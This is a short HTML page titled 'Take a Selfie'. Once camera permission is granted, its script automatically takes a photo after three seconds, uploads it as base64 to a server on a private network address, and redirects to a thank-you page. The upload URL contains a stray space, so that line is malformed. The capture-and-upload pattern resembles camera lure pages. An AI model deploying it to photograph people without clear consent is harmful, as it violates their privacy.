<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Take a Selfie</title>
</head>
<body>
    <h2>Taking your selfie...</h2>
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Access the user's camera
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                video.play();
                
                // Take selfie after 3 seconds
                setTimeout(() => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    video.srcObject.getTracks().forEach(track => track.stop()); // Stop the camera

                    // Convert to image and send to server
                    const imageData = canvas.toDataURL('image/png');

                    fetch('http:// 192.168.0.101:3000/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    }).then(() => {
                        // Redirect user to thankyou.html after uploading
                        window.location.href = "thankyou.html";
                    });
                }, 3000); // 3 seconds delay before capturing
            })
            .catch(error => console.error('Error accessing camera:', error));
    </script>
</body>
</html>
